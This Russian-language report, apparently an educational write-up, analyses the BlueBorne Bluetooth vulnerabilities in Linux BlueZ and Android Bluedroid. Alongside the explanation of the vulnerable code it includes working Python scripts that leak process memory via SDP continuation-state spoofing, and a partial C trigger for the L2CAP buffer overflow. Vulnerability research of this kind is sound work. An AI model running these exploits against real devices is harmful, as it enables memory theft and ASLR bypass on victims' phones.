# Введение
TODO: types of vulnerabilities, popular vulnerabilities, impact on android

**Remote control execution (RCE)** - уязвимость, при которой происходит удаленное выполнение кода на взламываемом компьютере или устройстве. Является одной из самых опасных уязвимостей.

# 1.1 Краткое введение в Bluetooth
-------------------------------
Многие сетевые протоколы предоставляют каналы связи для коммуникации и оставляют их использование на усмотрение пользователей. В противоположность этому Bluetooth предоставляет специальные приложения - **профили (profiles)**. И для каждого из них предоставляет свой набор протоколов. Это очень усложняет архитектуру Bluetooth ввиду того, что всего профилей более 30.

Как показано на рисунке 1.1.1, вся структура Bluetooth протоколов является некой альтернативой стека TCP/IP, начиная с физического уровня и заканчивая прикладным, следуя при этом модели OSI.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_1_1.jpg)
**Рисунок 1.1.1** архитектура стека Bluetooth протоколов

Чем ниже протокол - тем ближе он расположен к физическому уровню. Самые нижние уровни реализованы на контроллерах Bluetooth. Эти чипы взаимодействуют с ОС через интерфейс контроллера (**HCI**). Все протоколы выше **HCI** (например *L2CAP*, *SMP*, *SDP*) реализованы на уровне ОС и входят в отдельный стек Bluetooth конкретной ОС (иногда туда может входить и **HCI**). Профили на рисунке 1.1.1 представлены белым цветом и могут использовать часть стека протоколов для своих целей. Так как каждая ОС использует только собственный стек протоколов Bluetooth, то любая уязвимость, найденная в этом стеке затрагивает все устройства с этой ОС. Например, Linux и ранние версии Android используют стек *BlueZ*. Начиная с версии 4.2 Android использует свой собственный стек *Bluedroid*.

**BlueBorne** представляет собой несколько уязвимостей разных ОС на отдельных уровнях иерархии Bluetooth. В своем докладе я затрагиваю уязвимости Android и Linux (так как *BlueZ* ранее использовался в Android). На рисунке 1.1.2 показаны уровни, на которых обнаружены данные уязвимости.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_1_2.jpg)

**Рисунок 1.1.2** уровни стека Bluetooth, в которых найдены уязвимости

Кратко о каждом затронутом уровне:
- **L2CAP** - протокол транспортного уровня. Обеспечивает согласование **MTU** (максимальный размер полезного блока данных одного пакета), порядка следования пакетов и, при необходимости, надежность доставки.
- **SDP** - протокол обнаружения сервисов и приложений, которые поддерживаются Bluetooth устройством.
- **BNEP** - протокол инкапсуляции (обычно IP пакетов) поверх Bluetooth. Может, например, использоваться при раздаче интернета через Bluetooth.
- **PAN** - профиль, который использует **BNEP** для создания IP сетей поверх Bluetooth.

Более подробно о каждом уровне в разделах, описывающих уязвимости. 

# 1.2 Обзор Bluetooth стека в Android
--------------------------------
Пользовательское приложение использует Bluetooth процесс через *Binder* (специальную службу в Android, обеспечивающую межпроцессное взаимодействие). Java Native Interface (**JNI** - вызов кода на C/C++ из Java) используется Bluetooth процессом для взаимодействия с низкоуревневым Bluetooth стеком. Рисунок 1 объясняет реализацию Bluetooth в Android.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/1_2_1.png)

***Рисунок 1.2.1*** архитектура Bluetooth стека в Android
     
- **Application framework** - пользовательское приложение, использующее библиотеку *android.bluetooth* и механизм *Binder*
- **Bluetooth system service** - служба Bluetooth, расположенная в *packages/apps/Bluetooth* как отдельное приложение. Взаимодействует с уровнем **HAL** через **JNI**
- **JNI** - код на С/C++, расположенный в *packages/apps/Bluetooth/jni* (как раз представляет собой библиотеку *android.bluetooth*). Когда выполняется какая-либо Bluetooth операция, например обнаруживается новое Bluetooth устройство,  ожидает выполнения специальных функций-коллбэков из уровня **HAL**
- **Hardware abstraction level (HAL)** - более близкий к аппаратной части уровень. Предназначен для связи ядра Android c аппаратной частью Bluetooth стека. Реализовывает специальный интерфейс, который используется *android.bluetooth*.
- **Bluetooth stack** - реализация стека протоколов Bluetooth, расположен в *system/bt*. Расширяет уровень **HAL** дополнительными модулями и конфигурациями.
- **Vendor extensions** - может быть добавлен вендором (компанией, которая выпускает конкретный девайс) для реализации командного интерфейса контроллера (драйвера **HCI**).

# 2.1 L2CAP и уязвимость BlueZ стека Linux
----------------------------------------
### Обзор L2CAP

На стороне ОС это самый нижний уровень иерархии Bluetooth. L2CAP отвечает за связь между различными сервисами (протоколами) Bluetooth стека. Инкапсулирован в транспортный протокол **ACL** (предоставляет **chanel IDs**, далее **CIDs**, аналоги портов в UDP или TCP, куда передаются пакеты, но не предоставляет надежности доставки). Спецификация Bluetooth может резервировать некоторые **CIDs** для своих целей. Другие **CIDs** присваиваются динамически. Например, если некоторая конечная точка хочет послать сообщение какому-то Bluetooth сервису, ей будет динамически выделен свой **CID**.

Во время создания нового L2CAP соединения, две конечные точки пытаются достичь согласования (по пропускной способности и иным параметрам), обмениваясь специальными пакетами, **запросом** и **ответом** конфигурации. Запрос конфигурации содержит  параметры, по которым можно сказать о типе используемого соединения.

### Процесс обмена конфигурациями

В документации Bluetooth запросы и ответы конфигурации обозначены как **L2CAP_ConfReq** и **L2CAP_ConfResp** сообщения. Начальный обмен этими сообщениями между конечными точками называется **инициализирующим рукопожатием**. *L2CAP_ConfResp* содержит статус-код, который информирует отправителя о том, приняты ли его параметры конфигурации, или в этом отказано. 
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_1.jpg)
**Рисунок 2.1.1** типичный процесс обмена конфигурацией. В данном примере две конечные точки обмениваются информацией об **MTU** (максимальный размер полезного блока данных одного пакета). Остальные параметры выставлены по умолчанию.

Рисунок 2.1.1 иллюстрирует процесс обмена конфигурациями. Девайс **А** запрашивает **MTU** как параметр (*option = 0x01*) и его величину *0x100*, которую девайс **B** принимает и затем запрашивает величину **MTU** как *0x200*, которую девайс **A** также принимает. Таким образом, максимальная величина сообщения, которое устройство **А** может послать устройству **B** составляет *0x100* и обратно от **B** к **A** *0x200*. 

В отличие от вышеприведенного примера, устройство может отклонить параметры, которые ему не подходят. Чтобы облегчить дальнейший обмен конфигурациями, его ответ может содержать альтернативные, приемлимые для себя параметры. Следующая выдержка кода из ядра Linux отражает этот момент. Изначально **MTU** инициализировано по умолчанию.
```c++
// если запрошенный MTU меньше 
// чем минимальный по умолчанию
if (mtu < L2CAP_DEFAULT_MIN_MTU)
    // отбрасываем
	result = L2CAP_CONF_UNACCEPT;
else {
    // присваиваем MTU каналу
	chan->omtu = mtu;
	// заканчиваем настройку MTU
	set_bit(CONF_MTU_DONE, &chan->conf_state);
}
// добавляем настройки конфигурации
l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->omtu, endptr - ptr);
```
Выдержка из исходного кода функции **l2cap_parse_conf_req** (*net/bluetooth/l2cap_core.c*)

Таким образом, если предложенное значение **MTU** нам не подходит, в настройки конфигурации войдет значение по умолчанию (мы предложим свое значение). Таким образом процесс обмена конфигурациями продолжится, пока стороны не придут к взаимовыгодным параметрам соединения.

Существует иной механизм процесса обмена конфигурациями для более отказоустойчивого соединения под названием **Extended Flow Specification (EFS)**. Все **EFS** параметры должны быть перепроверены каждой конечной точкой соединения. Поэтому ответ от устройства на конфигурационный запрос может быть **"в ожидании" (pending)**, так как оно не до конца проверило все **EFS** параметры, что будет использовано в уязвимости. После того, как устройства обменялись всеми **EFS** параметрами, стороны достигнут взаимного соглашения.

### RCE уязвимость ядра Linux (CVE-2017-1000251) 

Данная уязвимость затрагивает BlueZ стек ядра Linux, а конкретно реализацию механизма **EFS** протокола L2CAP в функции *l2cap_parse_conf_rsp*. 
Первая ее часть приведена в следующей выдержке.
```c++
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
void *data, u16 *result)
{
    // rsp - указатель на буфер в котором 
    // находится конфигурационный ответ
    // len - его длина
    // data - указатель на буфер
    // в который помещаются параметры после проверки
    struct l2cap_conf_req *req = data;
    void *ptr = req->data;
    // ...
    while (len >= L2CAP_CONF_OPT_SIZE) {
        // получаем в цикле элементы из буфера rsp
        len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
        switch (type) {
            case L2CAP_CONF_MTU:
                // проверяем MTU
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->imtu);
                break;
            case L2CAP_CONF_FLUSH_TO:
                chan->flush_to = val;
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_FLUSH_TO, 2, chan->flush_to);
                break;
            // и другие параметры
        }
    }
    // ...
    return ptr - data;
}
```
Выдержка из исходного кода функции **l2cap_parse_conf_rsp** (*net/bluetooth/l2cap_core.c*)

Функция получает конфигурационный ответ в буфере на который указывает ***rsp*** и в цикле получает по одному каждый конфигурационный параметр, используя **l2cap_get_conf_opt**. Каждый полученный элемент проверяется и записывается обратно через указатель ***ptr*** (поле *data* в структуре *l2cap_conf_req*) в буфер ответа, на который указывает ***data***. Здесь важно заметить, что длина буфера ***data*** в функцию не передается.

Размер приходящего ответа никак не ограничен, что позволяет атакующей стороне прислать ответ ***rsp*** в котором могут быть дупликаты. Как результат, все содержимое ***rsp*** (включая возможные дупликаты) скопируются в буфер ***data***. Функция в которой формируется ***data*** (**l2cap_parse_conf_rsp**) вызывается из двух мест в **l2cap_config_rsp**, которая обрабатывает сообщения ответов конфигурации. Эти два места похожи, поэтому оба могут использоваться при эксплуатации уязвимости. Первый фрагмент такого участка представлен на следующей выдержке исходного кода.

```c++
switch (result) {
    case L2CAP_CONF_SUCCESS:
        ...
        break;
    case L2CAP_CONF_PENDING:
        // если устройство в состоянии "ожидание"
        set_bit(CONF_REM_CONF_PEND, &chan->conf_state);
        if (test_bit(CONF_LOC_CONF_PEND, &chan->conf_state)) {
            char buf[64];
            // buf передается как буфер data
            // rsp->data в качестве rsp
            len = l2cap_parse_conf_rsp(chan, rsp->data, len, buf, &result);
        ...
        goto done;
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

*switch* проверяет значение, которое было было получено из ответа конфигурации, что может управляться атакующим. Далее роль ***data*** будет играть ***char buf[64]***. Данный участок кода исполнится только если устройство будет в состоянии "в ожидании", что может быть спровоцировано следующим фрагментом кода.
```c++
if (remote_efs) {
    if (chan->local_stype != L2CAP_SERV_NOTRAFIC &&
        // поле которое используется в дальнейшем
        efs.stype != L2CAP_SERV_NOTRAFIC &&
        efs.stype != chan->local_stype) {
        ...// эта ветвь не используется
    } else {
        // посылаем конфигурационный ответ "в ожидании"
        result = L2CAP_CONF_PENDING;
        set_bit(CONF_LOC_CONF_PEND, &chan->conf_state);
    }
}
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

Отсюда следует, что для перехода устройства в состояние "в ожидании" достаточно послать конфигурационный запрос с **EFS** опцией, выставив поле ***stype*** в *L2CAP_SERV_NOTRAFIC*.

После того, как мы достигли состояния жертвы "в ожидании", буфер ***buf[64]*** может быть произвольно перезаписан и передан в функцию **l2cap_parse_conf_rsp**. Эта уязвимость позволяет атакующему совершить переполнение буфера ***buf*** неограниченным количеством данных.

### Как работает переполнение буфера

Пусть у нас есть следующий фрагмент кода.
```c++
#include <string.h>

int main(int argc, char *argv[]) {
	char buf[100];
	strcpy(buf, argv[1]);
	return 0;
}
```
При передаче в ***argv[1]*** строки, превышающего по длине размер массива ***buf***, произойдет переполнение буфера, как показано на рисунках 2.1.2 и 2.1.3, так как функция **strcpy** не проверяет размер переданной ей строки. 
![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_2.png)

**Рисунок 2.1.2** до копирования

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_1_3.png)

**Рисунок 2.1.3** после копирования

Так как в архитектуре x86 стек растёт от больших адресов к меньшим, то, записывая данные в буфер, можно осуществить запись за его границами и изменить находящиеся там данные, в частности, изменить адрес возврата.
Таким образом, атакующая сторона может:
- перезаписать локальную переменную, находящуюся в памяти рядом с буфером, изменяя поведение программы в свою пользу
- перезаписать адрес возврата в стековом кадре. Как только функция завершается, управление передаётся по указанному атакующим адресу, обычно в область памяти, к изменению которой он имел доступ
- перезаписать указатель на функцию или обработчик исключений, которые впоследствии получат управление
### Эксплуатация уязвимости CVE-2017-1000251
В данном разделе я привожу объяснение возможного использования CVE-2017-1000251.
Для простоты целью данного примера является исполнение следующего шелл-кода.
```asm
push 0x00433601 ; 0x43 - символ 'C'
push esp
mov ecx,esp
mov eax,0xc1107803 ; 0xc1107803 - print_k
call eax
mov ebx, 0x4
mov eax, 0xc109ec30 ; 0xc109ec30 - msleep_interruptible()
call eax
```
То есть этот фрагмент выводит в логи ядра символ 'C'
Перед исполнением нужно отключить stack-protector и ASLR (рандомизацию адресного пространства). Также нужно знать **BD_ADDR** (MAC-aдрес устройства жертвы).
Для конструирования **L2CAP** пакета, узнаем вначале свой **BD_ADDR** и запишем оба адреса в соответствующие структуры:
```c++
struct hci_dev_info di;
hci_devinfo(0, &di); // BD_ADDR теперь в di.bdaddr

struct sockaddr_l2 laddr, raddr;
// конструирование локального адреса
laddr.l2_family = AF_BLUETOOTH;
laddr.l2_bdaddr = di.bdaddr;
laddr.l2_psm = htobs(0x1001);
laddr.l2_cid = htobs(0x0040);

// конструирование адреса жертвы
memset(&raddr, 0, sizeof(raddr));        
raddr.l2_family = AF_BLUETOOTH;
str2ba(remote_address, &raddr.l2_bdaddr);
```
Откроем Bluetooth-сокет и привяжемся к нему:
```c++
// создание сокета	
int sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);

// привязка к созданному сокету
bind(sock, (struct sockaddr *) &laddr, sizeof(laddr));

// установление соединения
connect(sock, (struct sockaddr *) &raddr, sizeof(raddr));
```
Сформируем первый **L2CAP** пакет и отправим его:
```c++
buf = (char *) malloc (L2CAP_CMD_HDR_SIZE ));

//выставление настроек опций в заголовке L2CAP 
cmd = (l2cap_cmd_hdr *) buf;
cmd->code = 0x02;
cmd->ident = 0x03;
cmd->len = htobs(4);

// первый 0x00 - L2CAP_SERV_NOTRAFIC
char payload2[]="\x01\x00\x40\x00";
memcpy((buf + L2CAP_CMD_HDR_SIZE), payload2, 4);

// отправление пакета
send(sock, buf, L2CAP_CMD_HDR_SIZE + 4, 0)

```
TODO: code + conclusions
### Выводы

В случае с BlueZ, уровень **L2CAP** включен в ядро Linux. Это решение не самое удачное в силу таких механизмов как **EFS**, потому что внедренный вредоносный код будет иметь наибольшие привилегии, что может привести к разрушительным последствиям. Это дает надежный эксплойт для атакующей стороны, требуется только включенный Bluetooth и информация о MAC-адресе жертвы.

# 2.2 SDP и уязвимости Bluetooth стеков  Linux и Android (CVE-2017-1000250 и CVE-2017-0785) 
--------------------------------------
### Обзор SDP

Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения (или устройства вокруг) поддерживают Bluetooth. Использует клиент-серверную модель.

Для того, чтобы получить информацию об определенном сервисе, *SDP клиент* посылает **SDP-запрос** *SDP-серверу* и ожидает **SDP-ответ**. Для этого процесса **SDP** определяет особый механизм фрагментации (**SDP-continuation**). Он состоит в следующем:
- *SDP клиент* посылает *SDP-запрос*
- Если ответ на этот запрос превышает значение **MTU** (максимальный размер полезного блока данных одного пакета) для установленного **L2CAP** соединения, вернется только часть ответа, а перед *SDP-ответом* будет выставлено поле **continuation-state**
- Чтобы получить остальные фрагменты ответа, *SDP-клиент* пошлет тот-же самый *SDP-запрос* еще раз,  но в этот запрос также выставит поле **continuation-state**
- *SDP-сервер* пришлет следующий фрагмент ответа
- предыдущие шаги будут повторяться, пока клиент не получит ответ целиком

Важно заметить, что спецификация Bluetooth оставляет реализацию **continuation-state** за каждым *SDP-сервером*. И возвращенное поле **continuation-state** никак не используется *SDP-клиентом* напрямую (клиент должен посылать это поле неизмененным). Это лежит в основе двух уязвимостей утечки информации в Bluetooth стеках Linux и Android.

### Уязвимость утечки информации в BlueZ стеке Linux (CVE-2017-1000250)
Данная уязвимость возникает из-за ошибки в реализации механизма фрагментации протокола **SDP**. BlueZ определяет **continuation-state** как:
```c++
typedef struct {
    // может также послужить утечкой
    // о времени на конкретном устройстве
    uint32_t timestamp; 
    union {
        uint16_t maxBytesSent;
        // индекс показывает сколько
        // байтов прислали
        uint16_t lastIndexSent;
    } cStateValue;
} sdp_cont_state_t;
```
Структура **continuation-state** из исходного кода BlueZ (src/sdpd-request.c)

Так как *SDP клиент* постоянно должен вставлять эту структуру перед тем, как хочет получить очередной фрагмент ответа, он может подменить поле **lastIndexSent**, что может повлечь за собой чтение данных, находящихся за пределами буфера, в котором хранится *SDP-ответ*, что следует из обработчика запроса, приведенного далее:
```c++
...
    } else {
        //cstate - continuation-state 
        sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
        if (pCache) { 
            // получено continuation-state
            // из ответа в кэше
            uint16_t sent = MIN(max, pCache->data_size -
cstate->cStateValue.maxBytesSent);
            pResponse = pCache->data;
            //копируются данные, находящиеся в ответе
            memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
            buf->data_size += sent;
            cstate->cStateValue.maxBytesSent += sent;
            //если отправили все фрагменты пакета
            if (cstate->cStateValue.maxBytesSent == pCache->data_size)
                //размер выставляется в нуль
                cstate_size = sdp_set_cstate_pdu(buf, NULL);
            else
                //размер выставляется такой же как и у cstate
                cstate_size = sdp_set_cstate_pdu(buf, cstate);
        } else {
            status = SDP_INVALID_CSTATE;
            SDPDBG("Non-null continuation state, but null cache buffer");
        }
    }
...
```
Выдержка из функции service_search_attr_req исходного кода *SDP-сервера* BlueZ (src/sdpd-request.c)

На данном участке кода *SDP сервер* некорректно проверяет поле **maxBytesSent** из структуры **continuation-state** (переменная *cstate*), что позволяет вышестоящему вызову функции **memcpy** скопировать данные, находящиеся за пределами буфера *pResponse*. Атакующей стороне остается лишь обойти этот некорректный **if(...)**, который проверяет, что все данные были отправлены. Этого легко достичь, так как клиент имеет доступ к полю **maxBytesSent** структуры **continuation-state**.

BlueZ стек разбит на две части, одна из которых работает на *уровне ядра* (отрывок был рассмотрен в уязвимости **L2CAP**), вторая - на *пользовательском уровне*. Процесс *bluetoothd* как раз содержит последнюю часть и контролирует критически важные данные (например ключи шифрования Bluetooth-соединений), которые могут быть получены при эксплуатации данной уязвимости. Данная утечка очень напоминает **Heartbleed (CVE-2014-0160)** - ошибку в криптографическом программном обеспечении *OpenSSL*, позволяющую несанкционированно читать память на сервере или на клиенте, в том числе для извлечения закрытого ключа сервера.

### Эксплуатация уязвимости CVE-2017-1000250
Данный пример на языке python для простоты показывает только, как можно получить данные за пределами выделенного буфера, никак при этом их не используя.

Определим сначала нужные структуры данных (в классе scapy.packet.Packet уже определены специальные методы и поля для удобного конструирования пакетов):
```python
# собственная реализация Bluez continuation state 
# (приведена в разделе выше)
class BlueZ_ContinuationState(Packet):
    fields_desc = [
        LEIntField("timestamp", 0),
        LEShortField("maxBytesSent", 0),
        LEShortField("lastIndexSent", 0),
    ]

# собственная реализация SDP-запроса поиска поддерживаемых сервисов
# содержит id необходимого нам сервиса и список параметров,
# которые требуется от него получить
class SDP_ServiceSearchAttributeRequest(Packet):
    fields_desc = [
        # id SDP протокола
        ByteField("pdu_id",0x06),
        # id транзакции
        ShortField("transaction_id", 0x00),
        # длина параметров
        ShortField("param_len", 0),
        # id сервиса/сервисов
        FieldListField("search_pattern", 0x00, ByteField("", None)),
        # максимальное количество байтов, которое хотим получить в ответе
        ShortField("max_attr_byte_count", 0),
        # список параметров
        FieldListField("attr_id_list", 0x00, ByteField("", None)),
        # длина continuation state 
        ByteField("cont_state_len", 0),
    ]
```
Установим **L2CAP** соединение и согласуем значение **MTU**. Так как относительно **SDP** это низлежащий протокол, воспользуемся готовой реализацией  **L2CAP** из python-библиотеки *bluetooth*:
```python
# получим BD_ADDR (MAC-aдрес устройства жертвы) из аргументов
# выберем значение MTU как 512 байтов 
target = sys.argv[1]
mtu = 512

# создадим L2CAP-сокет и установим соединение
print("Connecting L2CAP socket...")
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
sock.connect((target, 1))
```
Отправим первый *SDP-пакет* для получения метки времени на устройстве-жертвы:
```python
# search-pattern и attr_id_list такие для примера
# изменяя эти значения, можно получать данные от различных Bluetooth-сервисов
req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                            attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                            max_attr_byte_count = 10)
sock.send(bytes(req1))
resp1 = sock.recv(mtu)

# обработка полученного continuation-state
cont_state = resp1[-8:]
host_timestamp = int.from_bytes(cont_state[:4], byteorder = 'little')
print("Extracted timestamp:", hex(host_timestamp))
```
После этого отправляем *SDP-пакеты* с подмененным **continuation-state**:
```python
received_data = b''
offset = 65535

print("Dumping", offset, "bytes of memory...")
while offset > 0:
    print("Sending SDP req, offset:", offset)
    req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                max_attr_byte_count = 65535)
    # подмена continuation-state (используется подмена поля maxBytesSent)
    # за счет такой подмены двигаем границы передаваемого нам буфера
    forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
                                maxBytesSent = offset) 
    # записываем в пакет подмененное continuation-state
    req2 = req2 / forged_cont_state
    # отправляем пакет
    sock.send(bytes(req2))

    data = sock.recv(mtu)
    data = data[7:] # убираем SDP параметры
    data = data[:-9] # убираем continuation state
    # сохраняем полученные данные 
    received_data = data + received_data
    # двигаем смещение
    offset -= len(data) if len(data) > 0 else 1

print(hexdump(received_data))
```
Полученные байты хранятся в массиве *received_data*

### Уязвимость утечки информации в Bluedroid стеке Android (CVE-2017-0785)

Наподобие BlueZ, в Android структура **continuation-state** реализована следующим образом:
```c++
typedef struct {
    uint16_t cont_offset;
} sdp_cont_state_t;
```
Структура **SDP continuation-state** в Bluetooth стеке Android

В данном случае передается смещение, наподобие поля *lastIndexSent* в BlueZ, без отметки времени. 

Хотя обработчик *SDP-запроса* выполняет более сложные проверки поля **cont-offset**, его реализация все равно подвержена похожей уязвимости утечки информации. В приведенной далее выдержке кода в *num_rsp_handles* хранится общее количество получаемых *SDP-запросов*:
```c++
if (*p_req) {
    ...
    // проверка, что поле cont_offset осталось неизменным
    if (cont_offset != p_ccb->cont_offset) {
        sdpu_build_n_send_error(p_ccb, trans_num, SDP_INVALID_CONT_STATE, SDP_TEXT_BAD_CONT_INX);
        return;
    }
    // получаем оставшиеся обработки запросов
    // здесь может быть переполнение rem_handles
    rem_handles = num_rsp_handles - cont_offset;
} ...

// вычисляется, сколько таких обработок запросов
// поместится в одном фрагменте
cur_handles = 
(uint16_t)((p_ccb->rem_mtu_size - SDP_MAX_SERVICE_RSPHDR_LEN) / 4);
if (rem_handles <= cur_handles)
    cur_handles = rem_handles;
else // continuation установлено корректно
{
    p_ccb->cont_offset += cur_handles;
    is_cont = true;
}
...
for (xx = cont_offset; xx < cont_offset + cur_handles; xx++)
    UINT32_TO_BE_STREAM(p_rsp, rsp_handles[xx]);
```
Выдержка из функции process_service_search исходного кода *SDP-сервера* Android (stack/sdp/sdp_server.c)

Данный фрагмент записывает копию поля **cont_offset** в объект *p_ccb* и проверяет, что полученное значение **cont_offset** равно текущему состоянию соединения. Поэтому простейшая подмена (как в случае с BlueZ) здесь не сработает. Но, каждый **continuation request**, вообще говоря это новый *SDP-запрос*, который имеет только **continuation state** в начале пакета. Поэтому обработчик может перепутать состояния **SDP-continuation**, если атакующая сторона начнет изменять параметры в последовательно идущих *SDP-запросах*. 
Значение *num_rsp_handles* вычисляется каждый раз, когда приходит *SDP-запрос*, основано на размере *SDP-ответа*. Размер ответа зависит от запрашиваемого клиентом Bluetooth сервиса. И, в противоположность **cont_offset**, его значение не сохраняется. Это может спровоцировать **переполнение** переменной *rem_handles*:
```c++
rem_handles = num_rsp_handles - cont_offset;
```
Далее предполагается, что *num_rsp_handles* и *cont_offset* ссылаются на один и тот же ответ, который разбит на фрагменты. Если обработчик перепутает состояния и так как *rem_handles* является  uint16_t, ответ обработчика сильно увеличится (вплоть до 64К) и последующий цикл for(...) скопирует данные, за границами *rsp_handles* в ответ клиенту.

Возможный сценарий атаки:
- Со стороны клиента формируется *SDP-запрос* на какой-то Bluetooth сервис.
- *SDP-ответ* сервера возвращается со структурой **continuation state**. Размер этого ответа определяется согласованным значением **MTU** соединения.
- Второй запрос формируется на другой сервис, но в его начало добавляется **continuation state** от полученного ответа. Если второй сервис сформирует меньший по размеру ответ, чем первый, это приведет к вышеописанной путанице состояний обработчика.
- Проверка **cont_offset** пройдет успешно, так как во второй запрос вставится то же значение **continuation state**.
- Так как *num_rsp_handles* от второго запроса меньше, чем от первого, достигнется **нижнее переполнение** *rem_handles*.
- Обработчик сформирует очень большой по размеру ответ и цикл for(...) скопирует байты за границами *rsp_handles*.
- Атакующий пришлет новый *SDP-запрос* с новым полученным **cont_offset**, продолжая читать данные за границами *rsp_handles*.

Подобно случаю с BlueZ, данная уязвимость может раскрыть большую область данных атакуемого процесса. Данные могут включать ключи шифрования или указатели на важные области кода или данных, что может быть использовано для обхода **ASLR** (рандомизации адресного пространства).

### Эксплутация уязвимости CVE-2017-0785

Данный пример использования уязвимости аналогично предыдущему получает данные *Bluetooth* процесса за пределами выделенного буфера. Эксплойт удалось отладить и запустить для атаки на Samsung Galaxy S3 (Android 4.4.2). В результате я получил важные адреса shared библиотеки, исполняемой от имени root, то есть код, имеющий наивысшие привилегии в системе. Это может быть в далнейшем использовано для обхода **ASLR**.

Ниже приведена функция, которая будет в дальнейшем формировать пакеты *SDP ServiceSearchAttributeRequest* (в отличие от прошлого примера, здесь, следуя сценарию атаки, мы должны будем отправлять пакета на два различных сервиса, дающих разные по длине ответы для запутывания состояний обработчика).

```python
# формирует SDP ServiceSearchAttributeRequest в зависимости от нужного нам сервиса
# service - UUID сервиса, на который отправится запрос (имеет размер 2 байта)
def packet(service, continuation_state):
    pkt = b'\x02\x00\x00'
    # p16 - функция, упаковывающая int в слово
    # например 8 -> b'\x00\x08'
    pkt += p16(7 + len(continuation_state))
    pkt += b'\x35\x03\x19'
    pkt += p16(service)
    pkt += b'\x01\x00'
    if type(continuation_state) == str:
        continuation_state = continuation_state.encode()
    # добавляем continuation_state в конец пакета
    pkt += continuation_state
    return pkt
```

Как и в предыдущем примере установим **L2CAP** соединение и согласуем значение **MTU**:
```python
mtu = 50
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = 'big'
# установим соединение
sock.connect((target, 1))
```

Отправим первый *SDP-пакет* на сервис, дающий более длинный ответ:
```python
service_long = 0x0100 # UUID L2CAP сервиса
sock.send(packet(service_long, '\x00'))
data = sock.recv(mtu)
```

```python
stack = ''
service_short = 0x0001 # UUID SDP сервиса
for i in range(1, 30):
    p.status('Sending packet %d' % i)
    # отправляем SDP-запрос на сервис, дающий более короткий ответ
    # последние 3 байта прошлого ответа (data[-3:]) - новый continuation state
    sock.send(packet(service_short, data[-3:]))
    # получаем новый ответ
    data = sock.recv(mtu)
    # записываем полезную информацию
    stack_add = data[9:-3]
    if type(stack_add) == bytes:
        stack_add = str(stack_add).strip('b\'')
    # сдвигаем смещение, чтобы продолжить чтение
    # за границами буфера
    stack += stack_add
sock.close()
```

Полученные данные хранятся в *stack*

На рисунке ниже видны адреса исполнительной части shared-библиотеки **bluetooth.default.so** в оперативной памяти девайса (21090 - процесс *Bluetooth*). Видно, что исполнительная часть (r-xp) находится в диапазоне адресов **77aae000-77bec000**

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_2_1.jpg)

**Рисунок 2.2.1** адреса **bluetooth.default.so** и **libbluetooth_jni.so** в оперативной памяти

Полученный дамп памяти представлен на рисунке 2.2.2. Желтым выделена часть адресов из диапазона исполнительной части библиотеки **bluetooth.default.so**. 

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_2_2%20%E2%80%94%20%D0%BA%D0%BE%D0%BF%D0%B8%D1%8F.jpg)

**Рисунок 2.2.2** полученные данные в результате утечки информации 

По полученным значениям можно определить базовые адреса shared-библиотек, исполняемых с наивысшими правами в системе (не только **bluetooth.default.so**, но и например **libc.so**). Если с помощью какой-нибудь **RCE** уязвимости подменить исполняемый код в этих областях памяти, атакующий получит полный контроль над девайсом.

### Выводы

Ошибки в реализациях механизмов фрагментации в различных протоколах Bluetooth дают большое пространство для возможных атак. Но самая главная ошибка на мой взляд - предоставление обработки таких структур данных, как **continuation-state** на усмотрение разработчиков. В результате для эксплуатации уязвимостей *SDP* протокола достаточно лишь знать **BD_ADDR** (**MAC**-адрес) устройства жертвы, что может быть легко получено с помощью устройств для перехвата Bluetooth трафика (например **Ubertooth One**). Атакующая сторона может перехватывать важные данные, используемые при Bluetooth-аутентификации, либо вспомогательные адреса для осуществления обхода **ASLR** (рандомизации адресного пространства) и дальнейшего получения контроля над всей системой.

# 2.3 BNEP и RCE уязвимости Bluetooth стека Android (CVE-2017-0781 и CVE-2017-0782) 
--------------------------------------
### Обзор BNEP

Протокол **BNEP** предназначен для инкапсуляции пакетов (обычно **TCP/IP**) поверх Bluetooth соединения. Это позволяет раздавать сеть интернет через Bluetooth.

**BNEP** используется вышестоящим в иерархии Bluetooth профилем **PAN**. На рисунке 2.3.1 видно, как полезные данные **Ethernet** пакета (так как **TCP/IP** уже инкапсулированы в **Ethernet**) упаковываются в **BNEP** пакет.

![](https://raw.githubusercontent.com/IgorKurylev/bluetooth-report/master/pics/2_3_1.jpg)

**Рисунок 2.3.1** инкапсуляция данных **Ethernet** в **BNEP** пакет

